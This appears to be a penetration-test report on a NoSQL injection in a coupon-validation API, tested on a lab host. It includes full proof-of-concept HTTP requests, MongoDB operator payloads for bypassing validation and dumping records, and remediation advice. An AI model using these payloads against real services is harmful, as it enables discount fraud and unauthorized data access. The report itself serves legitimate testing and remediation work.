# NoSQL Injection (Authentication Bypass / Data Exposure) – Coupon Validation API

---

## Summary

The endpoint:

```
POST /community/api/v2/coupon/validate-coupon
```

is vulnerable to **NoSQL Injection** via the `coupon_code` parameter.

An attacker can manipulate the query using MongoDB-style operators (e.g., `$ne`) to bypass validation and retrieve arbitrary coupon data.

---

## Affected Endpoint

```
POST /community/api/v2/coupon/validate-coupon
```

---

## Vulnerable Parameter

```json
"coupon_code": "<user-controlled input>"
```

---

## Root Cause

* The backend likely uses a NoSQL database (e.g., MongoDB)
* User input is passed directly into the query without sanitization
* No filtering of special operators like `$ne`, `$gt`, `$regex`

---

## Proof of Concept (PoC)

---

### 1. Normal Request (Fails)

#### Request

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "coupon_code": "GRCH112"
}
```

#### Response

```http
HTTP/1.1 500 Internal Server Error

{}
```

---

### 2. NoSQL Injection Payload (Bypass)

#### Request

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "coupon_code": {
    "$ne": 1
  }
}
```

---

#### Response

```json
{
  "coupon_code": "TRAC075",
  "amount": "75",
  "CreatedAt": "2026-06-11T13:55:14.268Z"
}
```

---

## Observation

* Supplying a MongoDB operator (`$ne`) bypasses the intended validation
* The backend returns a valid coupon without providing a legitimate code
* This indicates the query is interpreted as:

```js
db.coupons.find({ coupon_code: { $ne: 1 } })
```

Which matches **any document where coupon_code ≠ 1**

---

## Impact

### 1. Authentication / Validation Bypass

* Coupon validation logic can be bypassed entirely
* Users can retrieve valid coupons without authorization

---

### 2. Unauthorized Data Access

* Arbitrary coupon records can be retrieved
* Possible exposure of:

  * Coupon codes
  * Discount values
  * Creation timestamps

---

### 3. Coupon Abuse / Financial Impact

* Attackers can:

  * Apply valid coupons without knowing codes
  * Abuse discounts
  * Cause financial loss

---

### 4. Enumeration of Coupons

Using additional payloads:

```json
{ "coupon_code": { "$regex": ".*" } }
```

Attackers may:

* Dump all available coupons
* Iterate through database records

---

## Additional Test Payloads

### Match Any Record

```json
{ "coupon_code": { "$ne": null } }
```

---

### Regex Extraction

```json
{ "coupon_code": { "$regex": "^T" } }
```

---

### Boolean-Based Injection

```json
{ "coupon_code": { "$gt": "" } }
```

---

## Severity

### **High**

Because:

* Direct data access without authentication bypass
* Business logic compromise (coupon abuse)
* Potential for mass exploitation

---

## Recommendations

### 1. Input Validation

Ensure `coupon_code` is strictly a string:

```python
if not isinstance(coupon_code, str):
    reject_request()
```

---

### 2. Sanitize Special Operators

Block MongoDB operators:

* `$ne`
* `$gt`
* `$regex`
* `$where`

---

### 3. Use Parameterized Queries / ORM Safeguards

Avoid directly injecting user input into database queries.

---

### 4. Schema Enforcement

Use strict schema validation:

```json
{
  "coupon_code": "string"
}
```

---

### 5. Reject Object Inputs

If JSON object is received instead of string:

```json
{
  "coupon_code": { "$ne": 1 }
}
```

→ Reject immediately

---

## Conclusion

The application is vulnerable to **NoSQL Injection**, allowing attackers to:

* Bypass coupon validation
* Retrieve valid coupon data
* Abuse discount functionality

This leads to **unauthorized access and potential financial impact**, requiring immediate remediation.
